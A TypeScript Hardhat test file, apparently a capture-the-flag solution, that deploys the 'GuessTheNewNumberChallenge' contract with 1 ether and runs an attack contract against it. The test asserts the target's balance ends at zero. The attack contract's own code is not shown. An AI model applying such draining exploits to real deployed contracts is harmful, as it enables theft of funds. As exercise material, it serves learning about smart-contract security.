import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract } from 'ethers';
import { ethers } from 'hardhat';
const { utils, provider } = ethers;

describe('GuessTheNewNumberChallenge', () => {
  let target: Contract;
  let attackContract: Contract;
  let deployer: SignerWithAddress;
  let attacker: SignerWithAddress;
  let exploiter: SignerWithAddress;

  before(async () => {
    [exploiter, attacker, deployer] = await ethers.getSigners();

    target = await (
      await ethers.getContractFactory('GuessTheNewNumberChallenge', deployer)
    ).deploy({
      value: utils.parseEther('1'),
    });

    await target.deployed();

    target = await target.connect(attacker);

    attackContract = await (
      await ethers.getContractFactory('AttackGuessTheNewNumber', exploiter)
    ).deploy(target.address);
    await attackContract.deployed();
    
  });

  it('exploit', async () => {
    const tx = await attackContract.attack({
      value: ethers.utils.parseEther(`1`),
    });
    
    expect(await provider.getBalance(target.address)).to.equal(0);
  });
});
